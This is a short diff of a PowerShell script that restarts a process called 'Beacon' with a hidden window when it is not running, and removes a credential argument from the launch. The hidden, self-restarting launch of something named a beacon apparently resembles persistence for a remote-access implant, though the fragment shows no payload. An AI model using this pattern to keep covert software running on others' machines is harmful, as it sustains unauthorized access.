@@ -7,5 +7,5 @@ if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
 }
 else {
     Write-Output "Beacon not found. Starting now..."
-    Start-Process -FilePath $filePath -Credential $creds -WindowStyle Hidden
+    Start-Process -FilePath $filePath -WindowStyle Hidden
 }
